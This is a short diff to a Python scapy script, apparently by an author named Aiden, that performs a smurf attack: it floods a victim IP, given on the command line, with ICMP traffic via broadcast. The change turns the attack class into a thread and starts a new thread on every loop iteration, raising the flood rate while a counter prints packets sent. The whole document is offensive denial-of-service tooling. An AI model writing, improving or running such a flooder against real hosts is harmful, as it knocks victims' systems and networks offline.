@@ -2,7 +2,7 @@
 #author Aiden
 
 from scapy.all import *
-import socket, sys,re 
+import socket, sys,re ,threading
 from subprocess import check_output
 
 if len(sys.argv) != 2:
@@ -11,7 +11,7 @@ if len(sys.argv) != 2:
 victim = sys.argv[1]
 sys.tracebacklimit=0
 
-class smurf:
+class smurf(threading.Thread):
 	try:
 		def check(self):
 			global target,victim,broadcast
@@ -43,8 +43,7 @@ class smurf:
 		print 'Victim not available or there is some error with your IP!'
 		sys.exit(1)
 total = 0
-icmp = smurf()
 while True:
-	icmp.run()
+	smurf().start()
 	total += 1
 	sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
